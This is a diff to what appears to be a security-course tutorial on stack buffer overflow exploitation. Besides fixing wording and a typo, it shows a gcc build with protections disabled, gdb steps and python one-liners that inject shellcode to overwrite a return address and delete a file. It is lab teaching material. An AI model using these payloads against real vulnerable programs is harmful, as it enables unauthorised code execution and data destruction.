@@ -26,6 +26,7 @@ Insert 36 bytes shellcode + 32 bytes random character + overwrite 4 bytes ret ad
 Now we use gdb to observe the process
 - `gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`
 - Breakpoint at 0x0804846b <+48>
+
 ![Picture about creating breapoint at 0x0804846b](/Chapter-2/imgs/Inject-1-breakpoint.png)
 - `r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00'+'a'*32+'\xff\xff\xff\xff')")`
 
@@ -91,12 +92,12 @@ Now we watch the program
 - `0804807a` the address of `_filename` is wrong because the address is changed. It is `0xffffd702`
 - `\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x0c` is a wrong value of `_filename`. We have to change the last byte to `\x00` by using `set {unsigned char} 0xffffd70b = 0x00`
 
-So the final code is `r $(python –c "print ('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x02\xd7\xff\xff\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x0c' + 'a'*32 + '\xe8\xd6\xff\xff')")`
+So the final command is `r $(python –c "print ('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x02\xd7\xff\xff\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x0c' + 'a'*32 + '\xe8\xd6\xff\xff')")`
 - `set {unsigned char} 0xffffd70b = 0x00` after stopping at breakpoint
 
 ![Picture about watching ls](/Chapter-2/imgs/Inject-3-ls.png)
 
-Finally, when we use `ls`, we know that we seccessfully delete `dummyfile`.
+Finally, when we use `ls`, we know that we successfully delete `dummyfile`.
 
 ## b. Privilege escalation 
 
